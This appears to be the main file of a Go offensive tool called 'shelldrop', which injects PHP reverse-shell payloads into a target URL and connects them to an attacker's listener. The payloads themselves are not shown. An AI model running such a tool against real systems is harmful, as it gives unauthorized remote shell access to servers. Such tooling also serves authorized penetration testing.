package main

import "shelldrop/log"

func main() {
	cfg := ParseConfig()

	log.Info("Finding working reverse shell payloads, ensure your listener is running...")

	injector := NewInjector("php_1").
		WithListenerConfig(cfg.Listener).
		WithUrl(cfg.Request.Url)

	if err := injector.Do(); err != nil {
		log.Fatalf("Failed to inject payload: %v", err)
	}
}
